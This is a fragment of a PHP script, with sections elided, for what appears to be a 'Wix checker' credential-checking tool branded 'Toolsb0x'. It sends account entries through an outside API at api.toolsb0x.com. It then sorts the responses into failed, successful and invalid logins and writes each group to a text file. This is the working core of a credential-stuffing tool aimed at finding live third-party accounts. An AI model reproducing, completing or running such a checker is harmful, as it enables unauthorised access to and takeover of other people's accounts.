...
$urlapi = "http://api.toolsb0x.com/api/wix-checker.php"; ////change url api from sh
/////////////////////////////////////////////
...
$rollingCurl->setCallback(function(\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) {
    ...
    if(preg_match("#login_failed#", $x)) {
        ...
        file_put_contents("failed.txt", $contentx.PHP_EOL, FILE_APPEND);
        echo color()["LR"]."WIX FAILED".color()["WH"]." => ".$contentx." [Toolsb0x]".date("H:i:s");
    }elseif(preg_match("#login_sukses#", $x)) {
        $live++;
        $contentx = getStr($x,'"email":"','"}');
        file_put_contents("sukses.txt", $contentx.PHP_EOL, FILE_APPEND);
        echo color()["LG"]."WIX SUCCESS".color()["WH"]." => ".$contentx." [Toolsb0x]".date("H:i:s");
    }
    elseif(preg_match("#email_invalid#", $x)) {
        $unknown++;
        $contentx = getStr($x,'"email":"','"}');
        file_put_contents("invalid.txt", $contentx.PHP_EOL, FILE_APPEND);
        echo color()["LR"]."WIX INVALID".color()["WH"]." => ".$contentx." [Toolsb0x]".date("H:i:s");
    }
